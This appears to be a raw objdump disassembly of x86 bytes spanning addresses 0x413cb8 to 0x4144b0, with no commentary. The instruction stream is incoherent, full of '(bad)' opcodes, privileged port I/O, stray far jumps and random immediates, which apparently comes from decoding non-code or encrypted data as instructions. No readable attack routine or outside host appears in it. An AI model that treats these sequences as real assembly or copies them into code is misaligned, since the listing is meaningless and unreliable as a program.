  413cb8:	add    ebp,eax
  413cba:	dec    edx
  413cbb:	je     0x413d1f
  413cbd:	pop    es
  413cbe:	imul   esp,ebp,0x6c
  413cc1:	fidiv  DWORD PTR [edi]
  413cc3:	shr    BYTE PTR ds:0xf9bfa43e,1
  413cc9:	cmp    esi,DWORD PTR [eax]
  413ccb:	in     al,dx
  413ccc:	lods   eax,DWORD PTR ds:[esi]
  413ccd:	clc    
  413cce:	cld    
  413ccf:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413cd0:	cmp    ecx,DWORD PTR [edi-0xd2a7401]
  413cd6:	jmp    0x5ba2f945
  413cdb:	sbb    bl,BYTE PTR [ebp+0x19]
  413cde:	mov    ecx,0x5f8bb3b2
  413ce3:	pop    eax
  413ce4:	xchg   esp,eax
  413ce5:	mov    al,ds:0xcb02e5c1
  413cea:	lea    eax,[ebx]
  413cec:	sub    BYTE PTR [edi],dh
  413cee:	adc    BYTE PTR [edx+0x62],dh
  413cf1:	cmp    al,BYTE PTR [eax-0x3a]
  413cf4:	and    eax,DWORD PTR [edi+0x63d8dd32]
  413cfa:	call   FWORD PTR [edi]
  413cfc:	and    eax,0x2bbb943f
  413d01:	jb     0x413d34
  413d03:	lods   eax,DWORD PTR ds:[esi]
  413d04:	idiv   BYTE PTR [eax]
  413d06:	xchg   ebp,eax
  413d07:	sub    ebx,0xea931d11
  413d0d:	in     eax,dx
  413d0e:	sti    
  413d0f:	adc    ebx,DWORD PTR [eax-0xaa68b0]
  413d15:	jb     0x413d58
  413d17:	pop    eax
  413d18:	ret    
  413d19:	xor    cl,BYTE PTR [ecx+0x1a]
  413d1c:	mov    esp,0x4781d439
  413d21:	(bad)  
  413d22:	jno    0x413d69
  413d24:	sub    BYTE PTR [eax+eax*1-0x30],cl
  413d28:	fist   DWORD PTR [ecx+0x4cb9b1d7]
  413d2e:	sbb    BYTE PTR [ecx+0x6],0xe0
  413d32:	or     ebp,DWORD PTR [edx+0x20]
  413d35:	xlat   BYTE PTR ds:[ebx]
  413d36:	push   cs
  413d37:	jl     0x413d75
  413d39:	and    ecx,esp
  413d3b:	jmp    0x413cfb
  413d3d:	mov    esp,0xb0f4e77d
  413d42:	push   edx
  413d43:	adc    DWORD PTR [edx-0x404cebce],0x4e069a68
  413d4d:	pop    ecx
  413d4e:	(bad)  
  413d4f:	xchg   ebx,eax
  413d50:	sahf   
  413d51:	inc    esi
  413d52:	cld    
  413d53:	push   ss
  413d54:	push   esi
  413d55:	(bad)  
  413d56:	out    0xce,eax
  413d58:	or     ecx,DWORD PTR [ebx+0x5d]
  413d5b:	outs   dx,DWORD PTR ds:[esi]
  413d5c:	push   esp
  413d5d:	or     al,0x42
  413d5f:	int    0x47
  413d61:	xor    BYTE PTR [esi],0x16
  413d64:	pop    edi
  413d65:	inc    esp
  413d66:	call   0x4837:0x9a70adc1
  413d6d:	sti    
  413d6e:	cmc    
  413d6f:	cmc    
  413d70:	test   edi,0x8c8acfe0
  413d76:	or     esi,edx
  413d78:	fdiv   QWORD PTR [eax+0x41]
  413d7b:	sub    edx,DWORD PTR [edx]
  413d7d:	pusha  
  413d7e:	inc    ebp
  413d7f:	pop    ds
  413d80:	add    BYTE PTR [esi],0x78
  413d83:	call   0xa5ce:0xd26b6dbf
  413d8a:	and    esp,ecx
  413d8c:	lock sbb BYTE PTR [edx-0x5],bh
  413d90:	inc    esp
  413d91:	(bad)  
  413d92:	sbb    ah,BYTE PTR [eax+0x449202d0]
  413d98:	adc    BYTE PTR [ebp+0x31506433],dl
  413d9e:	out    dx,al
  413d9f:	or     ah,dh
  413da1:	imul   eax,DWORD PTR [eax-0x1],0x9d0818df
  413da8:	out    0x3,al
  413daa:	scas   eax,DWORD PTR es:[edi]
  413dab:	pop    ebp
  413dac:	xor    esi,DWORD PTR [eax+0x3e]
  413daf:	popf   
  413db0:	and    al,0xce
  413db2:	mov    edi,0x6a93284
  413db7:	inc    ebp
  413db8:	cmp    BYTE PTR [ebx-0x79],dh
  413dbb:	test   eax,0xf71ada30
  413dc0:	adc    al,BYTE PTR fs:[edi]
  413dc3:	fistp  WORD PTR [edi+0x59]
  413dc6:	xchg   edi,eax
  413dc7:	sub    edx,esi
  413dc9:	adc    dh,ch
  413dcb:	pop    ecx
  413dcc:	mov    esi,0x2694bf08
  413dd1:	repz mov ss,WORD PTR [ebp+0x2f]
  413dd5:	out    0x1c,al
  413dd7:	sbb    DWORD PTR [edx-0x34],0x183a50de
  413dde:	sbb    ch,BYTE PTR [eax+0x48]
  413de1:	add    DWORD PTR [edx-0x29],eax
  413de4:	cs pop ebx
  413de6:	adc    BYTE PTR [ebx],ah
  413de8:	nop
  413de9:	jo     0x413d97
  413deb:	ss push ds
  413ded:	xchg   ebx,eax
  413dee:	sar    DWORD PTR [ecx],1
  413df0:	xchg   DWORD PTR ds:0x100ab256,esp
  413df6:	pop    esi
  413df7:	shl    BYTE PTR [eax+ebp*4-0x635d76e],0x5a
  413dff:	sub    al,0x4d
  413e01:	dec    esp
  413e02:	adc    al,0x17
  413e04:	and    dh,0x90
  413e07:	push   ecx
  413e08:	fs push es
  413e0a:	pop    edx
  413e0b:	mov    edx,0x2fd7960
  413e10:	test   BYTE PTR [esi+ecx*4-0x71],ah
  413e14:	inc    ebp
  413e15:	(bad)  
  413e16:	stc    
  413e17:	sub    eax,0x68cc6109
  413e1c:	test   DWORD PTR [esi+0x71],ebp
  413e1f:	and    edx,DWORD PTR [ebp+ebx*8+0x9f0f80b]
  413e26:	add    eax,0xf66c227c
  413e2b:	int3   
  413e2c:	jnp    0x413e0b
  413e2e:	imul   edi,DWORD PTR [esi],0x7c
  413e31:	hlt    
  413e32:	enter  0x28dc,0x13
  413e36:	dec    ecx
  413e37:	(bad)  
  413e38:	loope  0x413ea1
  413e3a:	adc    bh,dh
  413e3c:	push   eax
  413e3d:	or     eax,0xf558a259
  413e42:	out    0x55,eax
  413e44:	fild   WORD PTR [eax+0x1bb58e7e]
  413e4a:	in     eax,0x4e
  413e4c:	stos   BYTE PTR es:[edi],al
  413e4d:	icebp  
  413e4e:	popf   
  413e4f:	and    ebx,DWORD PTR [edx-0x79]
  413e52:	leave  
  413e53:	rcr    BYTE PTR [ebx],cl
  413e55:	add    ebp,ebp
  413e57:	cld    
  413e58:	xchg   ecx,eax
  413e59:	idiv   DWORD PTR [eax]
  413e5b:	mov    al,0xe2
  413e5d:	dec    edx
  413e5e:	sbb    eax,0xd795bd8b
  413e63:	push   es
  413e64:	(bad)  
  413e66:	xchg   ebx,eax
  413e67:	cmp    al,0x61
  413e69:	jo     0x413e39
  413e6b:	lods   eax,DWORD PTR ds:[esi]
  413e6c:	add    BYTE PTR [edi],bh
  413e6e:	cwde   
  413e6f:	fld    QWORD PTR [ebp+0x39]
  413e72:	ins    BYTE PTR es:[edi],dx
  413e73:	mov    dl,0xcb
  413e75:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413e76:	and    bh,dh
  413e78:	pop    DWORD PTR [edx-0x18592852]
  413e7e:	mov    ah,BYTE PTR [eax]
  413e80:	ret    0x38ae
  413e83:	mov    ebx,0x455b1b0b
  413e88:	mov    BYTE PTR fs:[ebx],ah
  413e8b:	rcl    BYTE PTR [ebx-0x2b12e146],1
  413e91:	lea    esp,[edx-0x1]
  413e94:	and    eax,0x886e435c
  413e99:	pop    ebx
  413e9a:	mov    BYTE PTR [esi-0x58],ah
  413e9d:	mov    fs,WORD PTR [edi-0x3a]
  413ea0:	sbb    ebx,esi
  413ea2:	inc    edx
  413ea3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413ea4:	mov    ch,0xdd
  413ea6:	dec    eax
  413ea7:	sbb    DWORD PTR [eax-0x2e7d70d1],ecx
  413ead:	icebp  
  413eae:	push   es
  413eaf:	xor    dh,ah
  413eb1:	adc    DWORD PTR [esi+ecx*2-0x70494406],edx
  413eb8:	or     al,0x5f
  413eba:	mul    eax
  413ebc:	mov    dh,0x13
  413ebe:	pop    ecx
  413ebf:	mov    cl,0xf4
  413ec1:	ds mov ebp,0xa6eaaf9
  413ec7:	(bad)  
  413ec8:	jle    0x413e6d
  413eca:	std    
  413ecb:	jecxz  0x413e5a
  413ecd:	jmp    FWORD PTR [eax+0x38]
  413ed0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413ed1:	loop   0x413f17
  413ed3:	stos   DWORD PTR es:[edi],eax
  413ed4:	push   ds
  413ed5:	or     DWORD PTR [esi],0x96764bd5
  413edb:	in     al,dx
  413edc:	rol    BYTE PTR [ebp+0x55],1
  413edf:	rcr    eax,1
  413ee1:	xlat   BYTE PTR ds:[ebx]
  413ee2:	sub    DWORD PTR [esi-0x30],edi
  413ee5:	or     dh,dh
  413ee7:	mov    bl,0xc2
  413ee9:	sub    cl,BYTE PTR [edx+0x721ec504]
  413eef:	xor    eax,0x3f8749aa
  413ef5:	push   ds
  413ef6:	pop    ds
  413ef7:	sbb    BYTE PTR [esi-0xc88e438],cl
  413efd:	push   es
  413efe:	neg    BYTE PTR [esi-0x343246b1]
  413f04:	hlt    
  413f05:	cli    
  413f06:	int3   
  413f07:	and    ch,BYTE PTR [edi+0x27159ac5]
  413f0d:	dec    eax
  413f0e:	cmp    dl,BYTE PTR [ecx+0x65]
  413f11:	mov    al,ds:0xd4074add
  413f16:	mov    esi,0x9e0afa96
  413f1b:	rcr    DWORD PTR [edx+0x43],0x7d
  413f1f:	(bad)  
  413f21:	jg     0x413f27
  413f23:	cmp    dl,BYTE PTR fs:[edx-0x12]
  413f27:	cmp    DWORD PTR [esp+ecx*4-0x7817cbc7],0x1a
  413f2f:	sahf   
  413f30:	sbb    BYTE PTR [esi+edi*4],bl
  413f33:	lsl    esp,WORD PTR [eax+0x16ed402f]
  413f3a:	retf   
  413f3b:	shr    DWORD PTR [edx+0x1d],1
  413f3e:	cld    
  413f3f:	mov    WORD PTR [ebx],es
  413f41:	and    DWORD PTR [eax],ebp
  413f43:	and    DWORD PTR [ebx-0x1525aebd],0xfc0b3739
  413f4d:	dec    ebp
  413f4e:	(bad)  
  413f4f:	cmp    esi,DWORD PTR [ebp+ecx*2+0x2cb6a220]
  413f56:	int    0xf0
  413f58:	mov    ds:0xaa0f55bc,al
  413f5d:	aaa    
  413f5e:	jnp    0x413f3d
  413f60:	in     eax,dx
  413f61:	out    dx,al
  413f62:	cmp    al,0x55
  413f64:	outs   dx,BYTE PTR ds:[esi]
  413f65:	xchg   edi,eax
  413f66:	in     al,0xce
  413f68:	lea    edi,[edi+0x14892a15]
  413f6e:	cmp    esp,DWORD PTR [esi]
  413f70:	in     eax,dx
  413f71:	ficomp WORD PTR [eax]
  413f73:	rcr    BYTE PTR [edx-0x20360671],1
  413f79:	dec    eax
  413f7a:	inc    ecx
  413f7b:	shl    BYTE PTR cs:[ecx+0x4370049f],0xf0
  413f83:	jl     0x413f77
  413f85:	pusha  
  413f86:	jnp    0x413fce
  413f88:	stc    
  413f89:	xchg   edx,eax
  413f8a:	mov    cs,WORD PTR [ebp+0x67b2a5d0]
  413f90:	pop    edi
  413f91:	and    al,0x9a
  413f93:	xchg   edi,eax
  413f94:	jae    0x413f1d
  413f96:	push   ecx
  413f97:	mov    al,ds:0x4823d6b8
  413f9c:	jo     0x413f51
  413f9e:	les    esi,FWORD PTR [esi+0x57]
  413fa1:	push   0xed52d763
  413fa6:	add    BYTE PTR [edi],bh
  413fa8:	mov    esp,0x5d2351eb
  413fad:	jge    0x413f64
  413faf:	push   eax
  413fb0:	xchg   ebp,eax
  413fb1:	int3   
  413fb2:	ins    DWORD PTR es:[edi],dx
  413fb3:	nop
  413fb4:	int    0x46
  413fb6:	call   0x5a746e6d
  413fbb:	xor    DWORD PTR [esi+edi*8+0x1f077db6],0xffffff84
  413fc3:	mov    BYTE PTR [eax-0x4a7dfab3],cl
  413fc9:	push   es
  413fca:	(bad)  [esi]
  413fcc:	push   eax
  413fcd:	loop   0x413f68
  413fcf:	aad    0x92
  413fd1:	std    
  413fd2:	mov    BYTE PTR ds:0xb994a9ce,0x4e
  413fd9:	inc    edx
  413fda:	mov    ds:0xa2206431,al
  413fdf:	ins    DWORD PTR es:[edi],dx
  413fe0:	sbb    ecx,ebx
  413fe2:	dec    ebx
  413fe3:	pop    ebp
  413fe4:	and    DWORD PTR [edi+0xe769e6f],edx
  413fea:	push   DWORD PTR [eax-0x1af3ea70]
  413ff0:	mov    cl,0xc5
  413ff2:	test   al,0x64
  413ff4:	jmp    0xe783:0x1273fa82
  413ffb:	ds ret 
  413ffd:	sbb    eax,0x31539753
  414002:	xchg   BYTE PTR [edi],ah
  414004:	int    0xde
  414006:	add    DWORD PTR [ebp-0x5a],ebp
  414009:	push   esp
  41400a:	ficomp WORD PTR [esi+0x7d]
  41400d:	push   0xffffffb0
  41400f:	push   es
  414010:	or     eax,0xf5ae630
  414015:	ins    DWORD PTR es:[edi],dx
  414016:	and    bl,BYTE PTR [edx-0x708eb5d]
  41401c:	and    dl,bh
  41401e:	sub    al,BYTE PTR [edx+0x61]
  414021:	fadd   DWORD PTR [ebp+edi*1-0x39cd2d05]
  414028:	test   DWORD PTR [ebx+0x3d0e0d1a],0xe77cacac
  414032:	in     al,dx
  414033:	sub    esp,DWORD PTR [esi+esi*8-0x3e2e47cf]
  41403a:	and    BYTE PTR [ebp-0x215d8d6],dl
  414040:	imul   ebx,DWORD PTR [edx-0x76292fdd],0x60835ec7
  41404a:	mov    dl,0x72
  41404c:	lock aad 0xc2
  41404f:	std    
  414050:	int    0xc8
  414052:	test   eax,0x28e9baea
  414057:	add    esi,DWORD PTR [ebp+0xa]
  41405a:	adc    BYTE PTR [ecx+0x5c1f237e],0x27
  414061:	sbb    al,0x43
  414063:	fldenv [edi]
  414065:	pop    ss
  414066:	sar    BYTE PTR [edx-0x7d6751ff],1
  41406c:	imul   eax,DWORD PTR [ebp+0x63],0x6ac32e1e
  414073:	push   ds
  414074:	fs pop eax
  414076:	mov    ds:0xece748b,eax
  41407b:	mov    ebx,0x450260d1
  414080:	ret    0x5107
  414083:	test   BYTE PTR [edx-0xa9752bc],bh
  414089:	mov    WORD PTR ds:0x41772cde,?
  41408f:	gs jmp 0xd851:0x920158e6
  414097:	add    al,0x1d
  414099:	mov    DWORD PTR [edx+eiz*1-0xd],ebx
  41409d:	sbb    BYTE PTR [esi],dl
  41409f:	mov    eax,0xad096ba8
  4140a4:	cmp    eax,0xa94f119d
  4140a9:	cdq    
  4140aa:	push   esi
  4140ab:	or     DWORD PTR [edx],ecx
  4140ad:	xchg   edx,eax
  4140ae:	adc    dh,BYTE PTR [ebp+ebx*8+0xe]
  4140b2:	adc    dh,al
  4140b4:	jns    0x4140a1
  4140b6:	(bad)  
  4140b7:	aam    0xdb
  4140b9:	xor    al,0xf8
  4140bb:	push   0xffffffde
  4140bd:	test   DWORD PTR [ebx+0x78ff30cb],0xb42df88e
  4140c7:	xchg   esp,eax
  4140c8:	ret    
  4140c9:	jnp    0x414143
  4140cb:	(bad)  
  4140cc:	push   ebp
  4140cd:	ftst   
  4140cf:	jne    0x414063
  4140d1:	mov    eax,0x1dbf8b60
  4140d6:	clc    
  4140d7:	das    
  4140d8:	jnp    0x41411b
  4140da:	test   edi,ebx
  4140dc:	push   ss
  4140dd:	mov    DWORD PTR [esi],edx
  4140df:	inc    esi
  4140e0:	mov    al,ds:0xed7c2886
  4140e5:	sbb    BYTE PTR [esi-0x3e],cl
  4140e8:	push   cs
  4140e9:	daa    
  4140ea:	popa   
  4140eb:	push   ss
  4140ec:	add    eax,0x49d0b268
  4140f1:	mov    al,0x16
  4140f3:	jnp    0x414127
  4140f5:	mov    edx,0x6179a6a6
  4140fa:	sub    DWORD PTR [ebp+0x5c8b88e],ebx
  414100:	pop    es
  414101:	xchg   ebx,eax
  414102:	lds    esp,FWORD PTR [ecx-0x71]
  414105:	dec    esi
  414106:	clc    
  414107:	sbb    cl,dh
  414109:	cmp    esi,DWORD PTR [ebx-0xd]
  41410c:	lock sub DWORD PTR [ebx-0xe],esi
  414110:	mov    DWORD PTR [eax],esp
  414112:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414113:	fnstsw WORD PTR [edi+0x6193392c]
  414119:	popa   
  41411a:	enter  0xa112,0x3d
  41411e:	loopne 0x4140a5
  414120:	mov    dl,0x76
  414122:	test   al,0x5d
  414124:	repz push ebx
  414126:	or     eax,0x22ae41dd
  41412b:	fcmovne st,st(0)
  41412d:	loop   0x41413a
  41412f:	mov    edx,0x43a086c7
  414134:	jae    0x41416d
  414136:	adc    DWORD PTR [esi+ecx*2-0x58],ebp
  41413a:	mov    ch,BYTE PTR [edi+0x4d]
  41413d:	cmp    eax,0xe0632a32
  414142:	jno    0x41411e
  414144:	cld    
  414145:	ss push esi
  414147:	mov    ah,0xff
  414149:	inc    ebx
  41414a:	inc    ecx
  41414b:	ins    BYTE PTR es:[edi],dx
  41414c:	repz pop es
  41414e:	leave  
  41414f:	icebp  
  414150:	call   0x37db0543
  414155:	mov    ah,cl
  414157:	es addr16 cs xchg edx,eax
  41415b:	rcr    dl,0x92
  41415e:	adc    al,0xc5
  414160:	lods   eax,DWORD PTR ds:[esi]
  414161:	push   edx
  414162:	mov    eax,edx
  414164:	adc    BYTE PTR [ecx+0x1514aeea],al
  41416a:	fs shl bh,1
  41416d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41416e:	outs   dx,DWORD PTR ds:[esi]
  41416f:	(bad)  
  414170:	test   BYTE PTR [ebx+0xc],0x73
  414174:	push   es
  414175:	xchg   esp,eax
  414176:	stos   DWORD PTR es:[edi],eax
  414177:	xchg   BYTE PTR [edx+0x4],ch
  41417a:	dec    ecx
  41417b:	xchg   ebx,eax
  41417c:	mov    edx,0x81dbbbc6
  414181:	in     eax,dx
  414182:	dec    ebx
  414183:	(bad)  
  414184:	mov    ch,0xf6
  414186:	aam    0xc3
  414188:	xchg   esi,eax
  414189:	pop    edi
  41418a:	ret    0xa3f
  41418d:	es push eax
  41418f:	out    dx,al
  414190:	jmp    0x414193
  414192:	mov    DWORD PTR [edi-0x3eedda4f],edx
  414198:	adc    cl,ah
  41419a:	push   cs
  41419b:	xor    eax,0x174e09ec
  4141a0:	hlt    
  4141a1:	bound  esi,QWORD PTR [edi+0x77d798b]
  4141a7:	sub    al,0x1f
  4141a9:	inc    esi
  4141aa:	xor    ebx,edx
  4141ac:	jmp    0x4141dd
  4141ae:	jmp    0x4141b8
  4141b0:	mov    ah,0xcb
  4141b2:	xchg   edx,eax
  4141b3:	in     al,dx
  4141b4:	inc    eax
  4141b5:	les    eax,FWORD PTR [ecx+ebp*1+0x1531b55e]
  4141bc:	adc    DWORD PTR [edx],edx
  4141be:	cld    
  4141bf:	push   0x7ee3faff
  4141c4:	call   0x7238:0x373a93f6
  4141cb:	popf   
  4141cc:	cmp    DWORD PTR [edx],esp
  4141ce:	shr    bl,cl
  4141d0:	cmc    
  4141d1:	out    0xfe,al
  4141d3:	mov    bl,0x86
  4141d5:	push   cs
  4141d6:	jmp    0x175949c7
  4141db:	adc    al,0x67
  4141dd:	lea    eax,[esi+eiz*4-0x11]
  4141e1:	shr    BYTE PTR [eax+0x6b74c698],0xeb
  4141e8:	dec    edx
  4141e9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4141ea:	in     eax,0xb1
  4141ec:	clc    
  4141ed:	and    al,0x69
  4141ef:	ret    
  4141f0:	or     eax,0x6ea22450
  4141f5:	xor    ch,BYTE PTR [edx+0x6e]
  4141f8:	push   ds
  4141f9:	rcr    DWORD PTR [edi+ecx*2],1
  4141fc:	add    BYTE PTR [esi+0x43],dl
  4141ff:	daa    
  414200:	mov    bh,0xff
  414202:	sar    ecx,cl
  414204:	sbb    ebp,edi
  414206:	iret   
  414207:	adc    ch,al
  414209:	(bad)  
  41420a:	jecxz  0x414202
  41420c:	popf   
  41420d:	mov    bh,0x35
  41420f:	xchg   edx,eax
  414210:	sbb    eax,0xc14d6995
  414215:	lahf   
  414216:	inc    esp
  414218:	adc    ebx,ecx
  41421a:	imul   edx,DWORD PTR [edi],0x13
  41421d:	test   eax,0xb6d92c94
  414222:	lahf   
  414223:	pop    ecx
  414224:	fld    QWORD PTR [eax]
  414226:	add    al,0xaa
  414228:	mov    al,0x35
  41422a:	loope  0x41424b
  41422c:	push   esp
  41422d:	inc    ebx
  41422e:	in     eax,0xeb
  414230:	ret    0xbc12
  414233:	loope  0x414226
  414235:	push   edi
  414236:	mov    BYTE PTR [ebx-0x78],cl
  414239:	lods   al,BYTE PTR ds:[esi]
  41423a:	add    bh,BYTE PTR ds:0x2e0a1c2c
  414240:	pusha  
  414241:	test   eax,0x504f67fd
  414246:	mov    ds:0xbef8ff39,al
  41424b:	push   ecx
  41424c:	out    0x46,eax
  41424e:	mul    DWORD PTR [ecx-0x69]
  414251:	sub    ah,dh
  414253:	cs inc eax
  414255:	mov    ds:0x596b9d18,eax
  41425a:	cs mov eax,esi
  41425d:	sub    eax,0x7c5cabf1
  414262:	add    DWORD PTR [edx-0x36],ecx
  414265:	mov    ch,ch
  414267:	jl     0x4142e3
  414269:	push   esp
  41426a:	mov    esi,0xb1cb27bf
  41426f:	inc    eax
  414270:	es pusha 
  414272:	inc    esi
  414273:	mov    al,ds:0x5f343b66
  414278:	test   DWORD PTR [ecx-0x68],eax
  41427b:	in     eax,0x78
  41427d:	test   ah,bh
  41427f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414280:	into   
  414281:	pop    ds
  414282:	xchg   ebp,eax
  414283:	dec    ecx
  414284:	push   ss
  414285:	or     ebx,DWORD PTR [ebx]
  414287:	ss push cs
  414289:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41428a:	mov    DWORD PTR [esi-0x7f],ebp
  41428d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41428e:	pusha  
  41428f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414290:	xor    al,0x6b
  414292:	test   DWORD PTR [esi],eax
  414294:	xor    dh,bl
  414296:	mov    ebx,0xaff3c44f
  41429b:	dec    esp
  41429c:	cmp    al,BYTE PTR [ebx-0x25385caa]
  4142a2:	push   es
  4142a3:	(bad)  
  4142a4:	cmp    ebx,DWORD PTR [edx+0x4008978f]
  4142aa:	jmp    0x27f7:0x75b8ce80
  4142b1:	pop    edx
  4142b2:	imul   BYTE PTR [edi]
  4142b4:	clc    
  4142b5:	rcr    esp,0xc2
  4142b8:	push   ebx
  4142b9:	xchg   ebp,eax
  4142ba:	push   0xffffffc0
  4142bc:	jmp    0x4142ca
  4142be:	outs   dx,BYTE PTR ds:[esi]
  4142bf:	sbb    eax,0x499d8960
  4142c4:	pop    ebp
  4142c5:	add    DWORD PTR [edi+0x5aed2d14],esp
  4142cb:	nop
  4142cc:	mov    al,0x3d
  4142ce:	gs push edi
  4142d0:	fcomi  st,st(0)
  4142d2:	arpl   WORD PTR [eax],di
  4142d4:	jmp    0x8d6b7e6b
  4142d9:	dec    edi
  4142da:	aad    0x99
  4142dc:	pushf  
  4142dd:	(bad)  
  4142de:	sbb    ecx,DWORD PTR [esi-0x6ecd46]
  4142e4:	sub    eax,0x8b1bb62
  4142e9:	xchg   ebx,eax
  4142ea:	test   BYTE PTR [ebx+0x7cfc24c7],ch
  4142f0:	out    dx,eax
  4142f1:	or     al,0x92
  4142f3:	rcr    dh,0x79
  4142f6:	ins    BYTE PTR es:[edi],dx
  4142f7:	cmp    DWORD PTR [edi+ebx*4-0x2f],esi
  4142fb:	add    BYTE PTR [ecx+0xd],ch
  4142fe:	mov    eax,0x5b4a634f
  414303:	rcl    BYTE PTR [eax-0x54],0x5
  414307:	fldenv ds:0x123a7c8d
  41430d:	arpl   WORD PTR [edx-0x314d9223],dx
  414313:	rcr    DWORD PTR [esi-0x8478aea],cl
  414319:	out    dx,eax
  41431a:	sbb    eax,0xd9da6b2f
  41431f:	adc    bl,BYTE PTR es:[ebx]
  414322:	fs cmp eax,0x17fe0b1a
  414328:	or     al,0xcf
  41432a:	xor    eax,edi
  41432c:	cdq    
  41432d:	popf   
  41432e:	mov    cl,0xe7
  414330:	or     ecx,DWORD PTR [esi+edi*8-0x7fa7ae01]
  414337:	imul   esp,DWORD PTR [edx-0x4c],0x63
  41433b:	jp     0x414353
  41433d:	mov    esp,0x83b1ddc5
  414342:	jg     0x4143b4
  414344:	iret   
  414345:	neg    BYTE PTR [edi+0x501cf7d7]
  41434b:	fiadd  WORD PTR [edi+0x69355513]
  414351:	shr    DWORD PTR [esi],1
  414353:	das    
  414354:	push   eax
  414355:	loopne 0x414302
  414357:	or     bh,bh
  414359:	sbb    al,0xdd
  41435b:	cdq    
  41435c:	cli    
  41435d:	mov    cl,BYTE PTR [ebx]
  41435f:	icebp  
  414360:	push   0xfffffffa
  414362:	es pop es
  414364:	pop    ecx
  414365:	inc    edi
  414366:	mov    DWORD PTR [edx],edx
  414368:	add    eax,0x4430bd54
  41436d:	push   0xffffffb5
  41436f:	fistp  DWORD PTR [ebp-0x56]
  414372:	pushf  
  414373:	clc    
  414374:	adc    esp,DWORD PTR [edx]
  414376:	aaa    
  414377:	in     al,dx
  414378:	std    
  414379:	cld    
  41437a:	pop    ebx
  41437b:	or     edi,DWORD PTR [edx+0x113d1aac]
  414381:	cmp    BYTE PTR [esi-0x2561371],cl
  414387:	aas    
  414388:	push   ebx
  41438a:	es mov bl,0x59
  41438d:	in     al,dx
  41438e:	pop    ecx
  41438f:	outs   dx,BYTE PTR ds:[esi]
  414390:	pushf  
  414391:	das    
  414392:	sbb    al,cl
  414394:	out    0x9e,eax
  414396:	es mov dh,0xd1
  414399:	push   edi
  41439a:	push   es
  41439b:	frstor [eax-0x5a0a9d46]
  4143a1:	jecxz  0x414402
  4143a3:	sub    eax,0x4f44f73e
  4143a8:	xor    DWORD PTR [edi+ebp*1+0x56921076],0x694adec5
  4143b3:	cwde   
  4143b4:	pshufw mm4,QWORD PTR [ebp+0x689f1b83],0xdc
  4143bc:	das    
  4143bd:	iret   
  4143be:	das    
  4143bf:	dec    ebx
  4143c0:	loope  0x414426
  4143c2:	xor    bl,BYTE PTR [edx+0x24]
  4143c5:	ins    DWORD PTR es:[edi],dx
  4143c6:	iret   
  4143c7:	mov    ecx,0xf8390fc4
  4143cc:	xor    bh,al
  4143ce:	js     0x4143e4
  4143d0:	and    BYTE PTR [edi-0x38],0x3e
  4143d4:	adc    eax,0x43df07f2
  4143d9:	or     eax,0x2e6baf58
  4143de:	scas   al,BYTE PTR es:[edi]
  4143df:	cli    
  4143e0:	(bad)  
  4143e1:	aad    0xbf
  4143e3:	sub    dl,BYTE PTR [ebx-0x70]
  4143e6:	pop    ebx
  4143e7:	sti    
  4143e8:	lahf   
  4143e9:	add    esp,edx
  4143eb:	rol    BYTE PTR [ebx-0x43c6359c],0xde
  4143f2:	xchg   ebx,eax
  4143f3:	cld    
  4143f4:	je     0x414443
  4143f6:	push   0x2b95fa8d
  4143fb:	and    BYTE PTR [ebx-0x62],0x96
  4143ff:	cmp    eax,0x2faf910e
  414404:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414405:	(bad)  
  414406:	es stos DWORD PTR es:[edi],eax
  414408:	push   edi
  414409:	call   0xe70b8da9
  41440e:	xchg   esi,eax
  41440f:	cmc    
  414410:	lods   eax,DWORD PTR ds:[esi]
  414411:	or     ch,BYTE PTR [ecx-0x4f]
  414414:	cld    
  414415:	sub    DWORD PTR [esi],esi
  414417:	push   0xffffff94
  414419:	jge    0x41448e
  41441b:	add    BYTE PTR [edx-0x7a],0x20
  41441f:	sub    al,0x78
  414421:	ret    0x1da3
  414424:	in     al,0xc0
  414426:	shl    esp,0x97
  414429:	xchg   DWORD PTR [eax-0x32fc1ca2],edx
  41442f:	pop    ss
  414430:	push   edi
  414431:	mov    ecx,0x910b47a8
  414436:	outs   dx,DWORD PTR ds:[esi]
  414437:	sub    ch,ch
  414439:	mov    dl,0xb
  41443b:	aad    0xf3
  41443d:	dec    esp
  41443e:	adc    eax,0xeae9f7d7
  414443:	pop    ds
  414444:	inc    edi
  414445:	ins    DWORD PTR es:[edi],dx
  414446:	jge    0x414407
  414448:	ja     0x4143d2
  41444a:	inc    esp
  41444b:	push   0xc0957805
  414450:	pop    es
  414451:	add    edx,ebx
  414453:	push   0x9a517c23
  414458:	test   DWORD PTR [eax-0x5aee238f],ebx
  41445e:	scas   al,BYTE PTR es:[edi]
  41445f:	sbb    al,0x58
  414461:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414462:	addr16 in al,0x9d
  414465:	push   0xddd83199
  41446a:	mov    edi,0xf6f865ef
  41446f:	xchg   edi,eax
  414470:	ror    BYTE PTR [edx+0x28],0x32
  414474:	out    0xea,eax
  414476:	xor    DWORD PTR [esi],edx
  414478:	out    0x18,eax
  41447a:	loop   0x4144ea
  41447c:	cdq    
  41447d:	sub    BYTE PTR [ebp+eiz*2+0x58e7d559],cl
  414484:	loopne 0x414483
  414486:	push   esi
  414487:	or     eax,0xb5a35f15
  41448c:	shr    BYTE PTR [ebp-0x60c5a5d],1
  414492:	in     eax,0x3d
  414494:	sub    al,0x1f
  414496:	cdq    
  414497:	xchg   ecx,eax
  414498:	adc    al,0xda
  41449a:	aaa    
  41449b:	scas   al,BYTE PTR es:[edi]
  41449c:	jnp    0x4144fc
  41449e:	cmp    eax,0x13bbeefa
  4144a3:	xchg   esp,eax
  4144a4:	push   edx
  4144a5:	xchg   esp,eax
  4144a6:	int3   
  4144a7:	in     al,dx
  4144a8:	fadd   st(6),st
  4144aa:	sub    esi,DWORD PTR ds:0xa4c413e0
  4144b0:	nop
